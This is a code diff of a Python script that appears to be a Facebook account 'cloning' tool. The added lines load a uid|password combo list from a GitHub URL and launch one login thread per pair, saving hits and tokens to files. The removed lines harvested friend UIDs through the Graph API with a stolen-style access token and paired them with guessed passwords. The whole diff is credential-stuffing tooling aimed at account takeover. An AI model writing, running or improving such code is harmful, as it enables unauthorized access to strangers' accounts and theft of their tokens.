@@ -53,50 +53,24 @@ def login(uid, pwd):
         pass
 
 def combo_cloner():
-    print("\n📂 Enter path to combo file (uid|pass per line):")
-    path = input(">> ").strip()
+    print("\n📡 Loading combo.txt from GitHub...")
     try:
-        with open(path, "r") as file:
-            combos = file.read().splitlines()
-        print(f"\n🚀 Starting cloning on {len(combos)} accounts...\n")
+        url = "https://raw.githubusercontent.com/Labbaik757/Labbaik-Tool/main/combo.txt"
+        r = requests.get(url)
+        r.raise_for_status()
+        combos = r.text.strip().split("\n")
+        print(f"🚀 Starting cloning on {len(combos)} accounts...\n")
         for combo in combos:
             if "|" in combo:
                 uid, pwd = combo.split("|")
                 threading.Thread(target=login, args=(uid, pwd)).start()
         print(f"\n✅ Results saved in {DATE_DIR}/OK.txt | CP.txt | tokens.txt")
-    except FileNotFoundError:
-        print("❌ Combo file not found!")
+    except Exception as e:
+        print("❌ Failed to load combo.txt from GitHub:", e)
 
 def uid_dumper_combo():
-    token = input("🔑 Enter valid access token: ").strip()
-    public_uid = input("👤 Enter public UID: ").strip()
-    limit = input("📥 How many UIDs to dump (max 5000): ").strip()
-    try:
-        url = f"https://graph.facebook.com/{public_uid}/friends?limit={limit}&access_token={token}"
-        r = requests.get(url).json()
-        data = r["data"]
-        uids = [f"{user['id']}" for user in data]
-        print(f"✅ Total UIDs dumped: {len(uids)}")
-        passwords = input("🔐 Enter passwords (comma separated): ").split(",")
-        filename = input("💾 Enter filename to save combo (default: combo.txt): ").strip() or "combo.txt"
+    print("❌ UID Dumper not available in GitHub-only mode.")
+    print("👉 Use combo_cloner() to start cloning.")
 
-        with open(filename, "w") as f:
-            for uid in uids:
-                for pwd in passwords:
-                    f.write(f"{uid}|{pwd}\n")
-
-        print(f"\n✅ Combo saved to {filename}")
-        clone = input("🚀 Start cloning this combo now? (y/n): ").lower()
-        if clone == "y":
-            with open(filename, "r") as file:
-                combos = file.read().splitlines()
-            for combo in combos:
-                if "|" in combo:
-                    uid, pwd = combo.split("|")
-                    threading.Thread(target=login, args=(uid, pwd)).start()
-            print(f"\n✅ Results saved in {DATE_DIR}/OK.txt | CP.txt | tokens.txt")
-        else:
-            print("❌ Cloning cancelled.")
-
-    except Exception as e:
-        print("❌ Error during dump:", e)
+if __name__ == "__main__":
+    combo_cloner()
